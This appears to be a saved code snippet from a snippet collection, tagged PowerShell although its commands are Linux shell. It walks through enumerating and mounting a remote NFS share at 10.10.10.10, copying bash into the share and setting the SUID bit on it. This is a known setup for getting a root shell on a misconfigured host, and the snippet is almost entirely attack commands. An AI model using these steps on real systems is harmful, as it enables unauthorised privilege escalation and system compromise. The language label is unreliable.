---
id: 82fbba12-d12b-4ce2-85a2-3ccd3405f12d
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:19.322965+00:00'
updated_at: '2023-04-10T20:34:35.906290+00:00'
---

# Code Snippet 82fbba12

**Language**: Powershell

```powershell
# remote check the name of the folder
showmount -e 10.10.10.10

# create dir
mkdir /tmp/nfsdir  

# mount directory 
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```
